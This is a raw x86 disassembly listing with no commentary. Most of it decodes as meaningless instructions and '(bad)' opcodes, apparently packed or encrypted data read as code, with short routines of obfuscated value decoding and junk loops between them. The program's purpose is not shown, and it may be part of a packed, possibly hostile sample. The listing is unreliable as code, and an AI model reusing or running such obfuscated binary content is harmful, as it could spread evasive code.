  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	inc    DWORD PTR ds:0x98162145
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e451
  40e421:	add    eax,0x66438246
  40e426:	xlat   BYTE PTR ss:[ebx]
  40e428:	rcr    DWORD PTR [edi-0x471951a6],cl
  40e42e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e42f:	in     eax,dx
  40e430:	inc    ebp
  40e431:	add    edi,esp
  40e433:	int    0x5c
  40e435:	fisttp QWORD PTR [esi-0x4c]
  40e438:	mov    gs,WORD PTR [esi+0x24]
  40e43b:	sbb    ecx,DWORD PTR [edx+0x690643d8]
  40e441:	repnz in al,0x35
  40e444:	ja     0x40e3c6
  40e446:	mov    eax,0xa83d8163
  40e44b:	jne    0x40e47e
  40e44d:	inc    esi
  40e44e:	mov    eax,0x60714f08
  40e453:	gs mov ebx,0xc6e6be49
  40e459:	call   0x713d:0x3170e03a
  40e460:	xor    BYTE PTR ds:0x5ef8b820,ah
  40e466:	inc    esp
  40e467:	imul   edx,DWORD PTR [edi-0x167c4d4e],0xffffffcf
  40e46e:	mov    al,ds:0xede3918a
  40e473:	mov    ds:0xeb729a11,al
  40e478:	int    0x54
  40e47a:	adc    eax,0x61b2ab
  40e47f:	lahf   
  40e480:	cmp    DWORD PTR [edx-0x234a7fdb],esi
  40e486:	xor    BYTE PTR [ebp-0x6b038fbf],cl
  40e48c:	sbb    eax,0xebe97295
  40e491:	and    DWORD PTR [eax+ecx*8-0x3c288ce3],0x1dfa4c81
  40e49c:	es test al,0x23
  40e49f:	xchg   edi,eax
  40e4a0:	(bad)  
  40e4a1:	sub    eax,0xc0f2b8f5
  40e4a6:	pop    ss
  40e4a7:	in     eax,0x7c
  40e4a9:	cmp    DWORD PTR [edx+esi*1-0x61102ff7],edx
  40e4b0:	or     ebp,edx
  40e4b2:	clc    
  40e4b3:	mov    esi,DWORD PTR [edx-0x1ed0ae80]
  40e4b9:	in     eax,dx
  40e4ba:	adc    eax,0xe1caa721
  40e4bf:	mov    edx,0x764f9030
  40e4c4:	push   0x2e
  40e4c6:	fs aas 
  40e4c8:	or     al,0xd8
  40e4ca:	adc    DWORD PTR [eax+0x3a],ebp
  40e4cd:	inc    ecx
  40e4ce:	or     BYTE PTR [esi],0xd8
  40e4d1:	sbb    edx,DWORD PTR [eax+edx*2+0x684637d9]
  40e4d8:	(bad)  [ecx]
  40e4da:	push   esp
  40e4db:	ja     0x40e513
  40e4dd:	add    bh,bh
  40e4df:	sbb    BYTE PTR ds:0x43864e39,al
  40e4e5:	sub    BYTE PTR [ebx-0x203351d2],al
  40e4eb:	mov    bh,0xc3
  40e4ed:	mov    edx,0x9d26239b
  40e4f2:	fmul   st(5),st
  40e4f4:	inc    edi
  40e4f5:	mov    ebp,0x8e506779
  40e4fa:	out    dx,eax
  40e4fb:	scas   al,BYTE PTR es:[edi]
  40e4fc:	or     bh,BYTE PTR [ecx+0x5590584d]
  40e502:	cmp    bh,dh
  40e504:	mov    edx,0xc2d7f06e
  40e509:	sub    ebp,ebx
  40e50b:	jnp    0x40e4ce
  40e50d:	dec    esi
  40e50e:	sbb    DWORD PTR [edx],edx
  40e510:	jmp    0x91a3a122
  40e515:	mov    edx,DWORD PTR [edx-0x3e]
  40e518:	es mov ah,0x5c
  40e51b:	jns    0x40e4eb
  40e51d:	inc    ebx
  40e51e:	and    eax,0x4bf62ca5
  40e523:	mov    eax,ds:0x8954c957
  40e528:	mul    DWORD PTR ds:0x8548e6e8
  40e52e:	sbb    DWORD PTR [ebp+0x11d7b178],ecx
  40e534:	mov    WORD PTR [eax],?
  40e536:	adc    al,0xfd
  40e538:	fsincos 
  40e53a:	cmp    edx,ebx
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4336a3,0x4336eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xdbf261b8
  40e5b4:	xor    BYTE PTR ss:[esi+0x7e7e992a],bl
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5ce
  40e5c0:	pop    ss
  40e5c1:	xor    BYTE PTR [edi-0x5e],bh
  40e5c4:	jbe    0x40e5f5
  40e5c6:	adc    ebx,DWORD PTR [ecx+0x2e2423c9]
  40e5cc:	pop    esi
  40e5cd:	aam    0x8a
  40e5cf:	inc    ebp
  40e5d0:	mov    edi,0xd4e61fdc
  40e5d5:	and    edi,edx
  40e5d7:	idiv   DWORD PTR [ebx-0x3c]
  40e5da:	(bad)  
  40e5dc:	sahf   
  40e5dd:	ret    0x3507
  40e5e0:	dec    ebp
  40e5e1:	inc    ebx
  40e5e2:	sub    eax,0xd2192053
  40e5e7:	outs   dx,BYTE PTR ds:[esi]
  40e5e8:	jle    0x40e62a
  40e5ea:	addr16 jns 0x40e621
  40e5ed:	sbb    al,dh
  40e5ef:	xor    BYTE PTR ds:0x9572844f,bl
  40e5f5:	xor    BYTE PTR [ebx+0x35],0x51
  40e5f9:	les    eax,FWORD PTR [esp+edi*8-0x5faa08c0]
  40e600:	add    eax,0xd0919d08
  40e605:	mov    dh,0xf4
  40e607:	out    0xf5,eax
  40e609:	jg     0x40e5b5
  40e60b:	fst    st(0)
  40e60d:	add    ah,ch
  40e60f:	mov    WORD PTR [ecx-0x1d87fed6],ss
  40e615:	sbb    DWORD PTR [ecx-0x22],esp
  40e618:	xlat   BYTE PTR ds:[ebx]
  40e619:	xor    bl,BYTE PTR [eax]
  40e61b:	cs pushf 
  40e61d:	mov    ecx,0x94a06611
  40e622:	pop    edi
  40e623:	loopne 0x40e647
  40e625:	daa    
  40e626:	adc    ah,BYTE PTR [eax+0x21c3b4c1]
  40e62c:	xchg   BYTE PTR [ebx-0x51180143],bl
  40e632:	mov    edi,0x43385aec
  40e637:	and    bh,BYTE PTR [edx-0x12]
  40e63a:	inc    edi
  40e63b:	fnstcw WORD PTR [ecx+edx*4-0x12]
  40e63f:	and    BYTE PTR [esi+edx*1+0xfb1ec52],bh
  40e646:	jecxz  0x40e62d
  40e648:	inc    esi
  40e649:	adc    DWORD PTR [ebx+0x2d14c153],eax
  40e64f:	xor    al,0x1
  40e651:	jge    0x40e5da
  40e653:	fimul  DWORD PTR [ecx]
  40e655:	xchg   ebp,eax
  40e656:	retf   0x3c21
  40e659:	mov    al,0x7a
  40e65b:	popa   
  40e65c:	ret    0xf8f7
  40e65f:	sbb    al,0x22
  40e661:	xor    BYTE PTR [ecx+0x5d],ah
  40e664:	push   ebx
  40e665:	popf   
  40e666:	stos   DWORD PTR es:[edi],eax
  40e667:	rcr    DWORD PTR [ecx],cl
  40e669:	dec    edx
  40e66a:	add    eax,DWORD PTR [edx-0x4b]
  40e66d:	(bad)  
  40e66e:	jmp    0xfe9e4ca7
  40e673:	inc    ecx
  40e674:	sub    BYTE PTR [ebx],dh
  40e676:	ret    0x548e
  40e679:	aam    0xfa
  40e67b:	shr    DWORD PTR [eax-0x47],0xcc
  40e67f:	and    DWORD PTR [ebp-0x5df4f4bd],ebp
  40e685:	xor    eax,0xaa2965ea
  40e68a:	sbb    al,0xe9
  40e68c:	adc    eax,0x2d2e4a0b
  40e691:	push   cs
  40e692:	es fs in eax,dx
  40e695:	adc    ebp,ebp
  40e697:	repnz fwait
  40e699:	mov    ebx,0x10484f82
  40e69e:	and    al,0xad
  40e6a0:	js     0x40e66a
  40e6a2:	mov    DWORD PTR [edx+eiz*8+0x12],ebp
  40e6a6:	sbb    ah,BYTE PTR [edx-0x13]
  40e6a9:	rcr    DWORD PTR [ecx],cl
  40e6ab:	pop    esi
  40e6ac:	push   ecx
  40e6ad:	shr    ch,cl
  40e6af:	push   esp
  40e6b0:	rcl    DWORD PTR [ecx+ebp*2+0x5bc101d1],cl
  40e6b7:	jne    0x40e69f
  40e6b9:	sbb    al,0x1e
  40e6bb:	xor    dh,BYTE PTR ds:[edi-0x4f503ae0]
  40e6c2:	(bad)  
  40e6c3:	or     BYTE PTR es:[edx+0x6d1a418],al
  40e6ca:	and    esp,DWORD PTR [eax-0x4376e7cb]
  40e6d0:	inc    eax
  40e6d1:	not    BYTE PTR [ebp+0x79]
  40e6d4:	sub    al,0xb7
  40e6d6:	cld    
  40e6d7:	pop    edi
  40e6d8:	add    dl,BYTE PTR [ecx+edi*2+0x413b34a1]
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x433a558]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6c3
  40e704:	call   0x2815e5e4
  40e709:	jmp    0x40e75c
  40e70b:	sbb    al,0xf1
  40e70d:	mov    ds:0x86b1a7a3,al
  40e712:	mov    bl,0xed
  40e714:	ds xchg edi,eax
  40e716:	fst    QWORD PTR [eax]
  40e718:	or     esi,DWORD PTR [eax-0x42bb21bd]
  40e71e:	mov    edx,0xd305de3a
  40e723:	out    dx,al
  40e724:	mov    cl,0x6
  40e726:	sar    BYTE PTR [esi],1
  40e728:	pop    edx
  40e729:	xchg   ebp,eax
  40e72a:	ror    DWORD PTR [edx],0x1d
  40e72d:	xlat   BYTE PTR ds:[ebx]
  40e72e:	lahf   
  40e72f:	inc    esp
  40e730:	in     al,0xfe
  40e732:	shr    DWORD PTR [eax],0xa3
  40e735:	mov    ds:0x144ddb7d,eax
  40e73a:	call   0x7055026b
  40e73f:	add    esi,edi
  40e741:	jle    0x40e735
  40e743:	pop    ds
  40e744:	cmp    DWORD PTR ds:0x490e9453,0x3b
  40e74b:	add    eax,0x4274da44
  40e750:	outs   dx,BYTE PTR ds:[esi]
  40e751:	ins    DWORD PTR es:[edi],dx
  40e752:	rcl    DWORD PTR [eax-0x605f196a],cl
  40e758:	mov    dl,0xe6
  40e75a:	repz inc edx
  40e75c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e75d:	aas    
  40e75e:	push   edx
  40e75f:	fistp  WORD PTR [esi-0x4339f5ea]
  40e765:	call   0xde9d76f
  40e76a:	cmp    BYTE PTR [edi+0x61],dl
  40e76d:	jle    0x40e792
  40e76f:	call   0xd6c950d1
  40e774:	(bad)  
  40e775:	jp     0x40e7f1
  40e777:	and    edx,esp
  40e779:	jbe    0x40e701
  40e77b:	(bad)  
  40e77c:	data16 into 
  40e77e:	add    al,0xd7
  40e780:	out    0x22,al
  40e782:	ja     0x40e7fc
  40e784:	dec    esi
  40e785:	out    0x68,al
  40e787:	iret   
  40e788:	ret    0xdb6b
  40e78b:	adc    esi,edx
  40e78d:	sar    DWORD PTR [edi+eiz*1],1
  40e790:	jmp    0x3698acdb
  40e795:	imul   edx,ebx,0x85ddca97
  40e79b:	jnp    0x40e721
  40e79d:	shr    DWORD PTR [eax-0x3],0xb0
  40e7a1:	and    al,0xf1
  40e7a3:	test   al,0xe
  40e7a5:	sub    DWORD PTR [eax],ebx
  40e7a7:	(bad)  
  40e7a9:	xchg   ebx,eax
  40e7aa:	mov    al,0xb2
  40e7ac:	dec    edi
  40e7ad:	xor    eax,0x654539da
  40e7b2:	imul   DWORD PTR [ecx]
  40e7b4:	and    DWORD PTR [ebx-0x72],esp
  40e7b7:	ss int 0xe
  40e7ba:	adc    eax,0xe56f210
  40e7bf:	push   edi
  40e7c0:	mov    DWORD PTR [ecx-0x59f55fc7],esi
  40e7c6:	int    0x3d
  40e7c8:	outs   dx,BYTE PTR ds:[esi]
  40e7c9:	(bad)  
  40e7ca:	mov    cl,0x19
  40e7cc:	lods   al,BYTE PTR ds:[esi]
  40e7cd:	outs   dx,BYTE PTR ds:[esi]
  40e7ce:	mov    ebp,0x7f0ba5d1
  40e7d3:	into   
  40e7d4:	je     0x40e7ef
  40e7d6:	sbb    bl,BYTE PTR [ecx+eiz*8+0x12ae6a58]
  40e7dd:	and    ebx,ebx
  40e7df:	mov    ds:0xf785b1c5,al
  40e7e4:	je     0x40e7d3
  40e7e6:	shl    DWORD PTR [edx-0x44],cl
  40e7e9:	push   ecx
  40e7ea:	pop    ss
  40e7eb:	jnp    0x40e78f
  40e7ed:	jae    0x40e85b
  40e7ef:	iret   
  40e7f0:	aaa    
  40e7f1:	mov    ecx,0x3acd0e22
  40e7f6:	(bad)  
  40e7f7:	fld    QWORD PTR [ebp+0x7f113347]
  40e7fd:	and    dh,dh
  40e7ff:	aas    
  40e800:	xchg   edx,eax
  40e801:	pop    edx
  40e802:	dec    edx
  40e803:	test   eax,0xe5d6a941
  40e808:	sbb    eax,0xd3043383
  40e80d:	in     al,dx
  40e80e:	and    eax,0xf5c274c8
  40e813:	sub    al,0x5c
  40e815:	jno    0x40e833
  40e817:	mov    DWORD PTR [ebx+0x796ef4a2],edi
  40e81d:	pushf  
  40e81e:	(bad)  
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e7ff
  40e854:	dec    eax
  40e855:	sti    
  40e856:	out    0xe2,eax
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8ab
  40e860:	data16 mov al,ds:0x15112b7b
  40e866:	cs jecxz 0x40e877
  40e869:	sub    ebp,0x18
  40e86c:	pusha  
  40e86d:	lods   al,BYTE PTR ds:[esi]
  40e86e:	jmp    0xbd0416b9
  40e873:	stos   DWORD PTR es:[edi],eax
  40e874:	in     eax,dx
  40e875:	xor    eax,0x95a68dda
  40e87a:	dec    ecx
  40e87b:	xchg   DWORD PTR [edi],ebx
  40e87d:	in     al,dx
  40e87e:	outs   dx,BYTE PTR ds:[esi]
  40e87f:	push   0x671925f2
  40e884:	aas    
  40e885:	idiv   DWORD PTR [edx]
  40e887:	scas   al,BYTE PTR es:[edi]
  40e888:	fadd   DWORD PTR [edx-0xf]
  40e88b:	dec    edx
  40e88c:	in     eax,dx
  40e88d:	fsubrp st(2),st
  40e88f:	test   eax,0xc2072910
  40e894:	push   eax
  40e895:	mov    WORD PTR [ebp+0x42d21e3b],es
  40e89b:	mov    eax,ds:0x6256f6fb
  40e8a0:	clc    
  40e8a1:	mov    ah,ah
  40e8a3:	fbld   TBYTE PTR [bx+si-0x5e07]
  40e8a8:	inc    ecx
  40e8a9:	(bad)  
  40e8aa:	bound  edx,QWORD PTR [bx+0x2a]
  40e8ae:	jmp    0xc7c0805a
  40e8b3:	jns    0x40e88d
  40e8b5:	int    0x6e
  40e8b7:	lds    eax,FWORD PTR [esi]
  40e8b9:	sub    al,0x10
  40e8bb:	aas    
  40e8bc:	mov    ecx,0x3c1c5ad1
  40e8c1:	mov    ds:0x5b1e5861,eax
  40e8c6:	sbb    ch,dl
  40e8c8:	stos   DWORD PTR es:[edi],eax
  40e8c9:	(bad)  [esi]
  40e8cb:	call   0xff3650d8
  40e8d0:	lds    ebp,FWORD PTR [esi-0x1716cf96]
  40e8d6:	mov    ds:0x9ee9118c,al
  40e8db:	mov    ebp,DWORD PTR [eax-0x2ea540b7]
  40e8e1:	pop    ebx
  40e8e2:	inc    edx
  40e8e3:	shl    DWORD PTR [edi+0x50],0x25
  40e8e7:	push   ebx
  40e8e8:	or     al,0xbc
  40e8ea:	int3   
  40e8eb:	sahf   
  40e8ec:	and    esp,0x42
  40e8ef:	sar    eax,0xf9
  40e8f2:	cwde   
  40e8f3:	sbb    cl,0x11
  40e8f6:	clc    
  40e8f7:	hlt    
  40e8f8:	aas    
  40e8f9:	iret   
  40e8fa:	xchg   BYTE PTR [edi-0x2b66cf36],bl
  40e900:	repnz adc BYTE PTR [edi-0x5b30bb34],0xe3
  40e908:	into   
  40e909:	loop   0x40e938
  40e90b:	test   BYTE PTR [edi],al
  40e90d:	adc    al,0x68
  40e90f:	sub    al,0xa8
  40e911:	xor    BYTE PTR [ecx],0x41
  40e914:	addr16 mov ah,0x40
  40e917:	js     0x40e952
  40e919:	pop    ecx
  40e91a:	inc    edi
  40e91b:	sbb    dl,dl
  40e91d:	mov    esi,0x1929db25
  40e922:	(bad)  
  40e923:	ss sbb al,0xcc
  40e926:	fwait
  40e927:	dec    BYTE PTR [ecx-0x5]
  40e92a:	(bad)  
  40e92b:	popf   
  40e92c:	sbb    esi,DWORD PTR [edx]
  40e92e:	lea    esp,[ebp+0x5babe0c4]
  40e934:	(bad)  
  40e936:	loop   0x40e918
  40e938:	pop    ebp
  40e939:	retf   
  40e93a:	dec    edx
  40e93b:	xchg   esp,eax
  40e93c:	xchg   edx,eax
  40e93d:	push   ecx
  40e93e:	adc    BYTE PTR [esi-0x31],bl
  40e941:	leave  
  40e942:	sbb    BYTE PTR [eax+0x4c],dh
  40e945:	push   eax
  40e946:	push   eax
  40e947:	jp     0x40e97a
  40e949:	in     al,dx
  40e94a:	sub    eax,0x9a7fdb8f
  40e94f:	das    
  40e950:	cmp    edx,DWORD PTR [edx-0x6a]
  40e953:	inc    esp
  40e954:	dec    eax
  40e955:	xchg   edx,eax
  40e956:	push   ss
  40e957:	test   al,0xea
  40e959:	mov    eax,0x1e454c11
  40e95e:	sbb    BYTE PTR [ebp-0x75],dh
  40e961:	cmp    eax,0x52e2be28
  40e966:	and    eax,0xb1ed1f28
  40e96b:	retf   
  40e96c:	mov    al,ds:0x61b50182
  40e971:	fs jno 0x40e9f1
  40e974:	cdq    
  40e975:	mov    al,0xfa
  40e977:	in     eax,0x69
  40e979:	dec    eax
  40e97a:	sbb    DWORD PTR [edi],ecx
  40e97c:	test   DWORD PTR [esi],edi
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xc03d9a1d
  40e99c:	jb     0x40e924
  40e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99f:	jle    0x40ea1f
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e9ea
  40e9a6:	cli    
  40e9a7:	dec    ebp
  40e9a8:	and    DWORD PTR [ebx+ebp*1+0x47],esi
  40e9ac:	int3   
  40e9ad:	clc    
  40e9ae:	jg     0x40ea14
  40e9b0:	pop    ecx
  40e9b1:	ja     0x40e9c7
  40e9b3:	lea    eax,[edx]
  40e9b5:	jns    0x40e980
  40e9b7:	mov    BYTE PTR [edx+0x2],cl
  40e9ba:	inc    eax
  40e9bb:	icebp  
  40e9bc:	mov    ds:0x39eb8717,eax
  40e9c1:	adc    al,0x3
  40e9c3:	add    al,0x22
  40e9c5:	xchg   edx,eax
  40e9c6:	(bad)  
  40e9c8:	pop    edx
  40e9c9:	jmp    ebx
  40e9cb:	lds    edx,FWORD PTR ds:0xad91ddff
  40e9d1:	cmp    eax,0xfb21b699
  40e9d6:	adc    eax,0x98ce5228
  40e9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9dc:	cwde   
  40e9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9de:	psubsb mm3,QWORD PTR [ebx-0x495eaed7]
  40e9e5:	fistp  QWORD PTR [ebx-0x67aa18d5]
  40e9eb:	push   0x7b9a82ce
  40e9f0:	xchg   DWORD PTR [ebp+0x4e],ebx
  40e9f3:	inc    eax
  40e9f4:	cmp    BYTE PTR [edi+0x51e673e5],0x60
  40e9fb:	stos   DWORD PTR es:[edi],eax
  40e9fc:	loopne 0x40e9ee
  40e9fe:	(bad)  
  40e9ff:	cwde   
  40ea00:	aam    0x8a
  40ea02:	jge    0x40e9cc
  40ea04:	mov    BYTE PTR ds:0x36812e96,al
  40ea0a:	iret   
  40ea0b:	sbb    ebp,DWORD PTR [ebx+eiz*1+0x49]
  40ea0f:	add    eax,0x7ca08074
  40ea14:	cmp    BYTE PTR cs:[ebp-0x4b],ch
  40ea18:	fmul   st,st(2)
  40ea1a:	adc    ecx,ecx
  40ea1c:	fidivr WORD PTR [ebx-0x21]
  40ea1f:	dec    edx
  40ea20:	shl    eax,0xab
  40ea23:	je     0x40e9cd
  40ea25:	add    ebx,DWORD PTR [eax-0x22]
  40ea28:	rcl    BYTE PTR [ebx],cl
  40ea2a:	xchg   ebp,eax
  40ea2b:	add    eax,0xb078cd13
  40ea30:	popf   
  40ea31:	lods   eax,DWORD PTR ds:[esi]
  40ea32:	mov    ecx,0x8b7430cf
  40ea37:	jle    0x40ea22
  40ea39:	or     bh,dl
  40ea3b:	push   eax
  40ea3c:	cmc    
  40ea3d:	mov    dl,0xc8
  40ea3f:	pop    esp
  40ea40:	or     DWORD PTR [ebp+0x77],esi
  40ea43:	call   0x269a56ac
  40ea48:	add    BYTE PTR [ebp-0x1b],ch
  40ea4b:	rcl    DWORD PTR [ebx],cl
  40ea4d:	adc    edi,DWORD PTR [edx+0x6b02e06e]
  40ea53:	outs   dx,BYTE PTR ds:[esi]
  40ea54:	mov    dl,0x6a
  40ea56:	jle    0x40ea6e
  40ea58:	(bad)  
  40ea5a:	daa    
  40ea5b:	or     ecx,esi
  40ea5d:	mov    ecx,0x4d2239b3
  40ea62:	sub    ah,BYTE PTR gs:[esi+0x6]
  40ea66:	stos   DWORD PTR es:[edi],eax
  40ea67:	mov    al,ds:0xac7cbaf1
  40ea6c:	dec    ecx
  40ea6d:	mov    esp,0x2685000c
  40ea72:	shl    edi,1
  40ea74:	and    al,0x57
  40ea76:	inc    edi
  40ea77:	aaa    
  40ea78:	jb     0x40eacd
  40ea7a:	fist   WORD PTR [ebp+ebx*1+0x1e572352]
  40ea81:	out    dx,eax
  40ea82:	pop    edx
  40ea83:	fcom   QWORD PTR [eax]
  40ea85:	imul   ebp,DWORD PTR [esp+edi*4],0xfffffff0
  40ea89:	stc    
  40ea8a:	adc    eax,0xf2053b37
  40ea8f:	xor    cl,BYTE PTR [ebp-0x4614f8fa]
  40ea95:	inc    edx
  40ea96:	std    
  40ea97:	mov    esp,0x1ba32da3
  40ea9c:	leave  
  40ea9d:	inc    DWORD PTR ds:0xfdb371b6
  40eaa3:	test   DWORD PTR [ebx],edx
  40eaa5:	cmc    
  40eaa6:	rcr    DWORD PTR [eax],cl
  40eaa8:	adc    eax,DWORD PTR [eax-0x216c466a]
  40eaae:	pop    ecx
  40eaaf:	lea    ecx,[edi-0xb2b8ac]
  40eab5:	xor    eax,0x83b8207c
  40eaba:	frstpm(287 only) 
  40eabc:	ins    BYTE PTR es:[edi],dx
  40eabd:	jno    0x40eb2e
  40eabf:	mov    esp,0x5bc30362
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    al,ah
  40ebb4:	and    edi,ecx
  40ebb6:	fstp   QWORD PTR [edx+0x547e7ea5]
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb62
  40ebc0:	xor    ebx,esi
  40ebc2:	pop    ebx
  40ebc3:	rcr    BYTE PTR [ebx+0x1e220c5b],0x98
  40ebca:	mov    WORD PTR [ebx-0x6b],?
  40ebcd:	push   0xa376ce88
  40ebd2:	repnz or BYTE PTR [eax+0x3a897e2],0xe3
  40ebda:	cmc    
  40ebdb:	or     eax,0x734a3f6a
  40ebe0:	pop    ebp
  40ebe1:	add    ebx,0xffffffed
  40ebe4:	mov    ds:0x59e18d28,eax
  40ebe9:	ins    DWORD PTR es:[edi],dx
  40ebea:	pop    ss
  40ebeb:	sub    eax,0x690ba56f
  40ebf0:	jb     0x40ec64
  40ebf2:	xor    dh,BYTE PTR [ebp-0x4aecd754]
  40ebf8:	loope  0x40eba4
  40ebfa:	dec    ecx
  40ebfb:	enter  0x4515,0xe
  40ebff:	into   
  40ec00:	cmp    bl,BYTE PTR [esi-0x4]
  40ec03:	jnp    0x40ec3e
  40ec05:	daa    
  40ec06:	js     0x40eb8a
  40ec08:	test   al,0x4c
  40ec0a:	(bad)  
  40ec0b:	out    0xa8,eax
  40ec0d:	jmp    0xbcb0c0ed
  40ec12:	dec    ebp
  40ec13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec14:	xchg   BYTE PTR [edx-0x79],ah
  40ec17:	jp     0x40ebc8
  40ec19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec1a:	mov    DWORD PTR [eax+0x28],edi
  40ec1d:	dec    edi
  40ec1e:	dec    ebp
  40ec1f:	(bad)  
  40ec20:	cdq    
  40ec21:	outs   dx,BYTE PTR ds:[esi]
  40ec22:	das    
  40ec23:	add    al,0x42
  40ec25:	xchg   ecx,eax
  40ec26:	xor    esp,ecx
  40ec28:	std    
  40ec29:	cli    
  40ec2a:	stc    
  40ec2b:	xor    DWORD PTR [ebp+0x7],edi
  40ec2e:	add    al,0xd9
  40ec30:	pop    esi
  40ec31:	jge    0x40ec25
  40ec33:	xor    al,0xb3
  40ec35:	sub    esp,0xc4819f6f
  40ec3b:	mov    al,ds:0x62ab80d5
  40ec40:	in     al,0xb4
  40ec42:	lods   eax,DWORD PTR ds:[esi]
  40ec43:	inc    edx
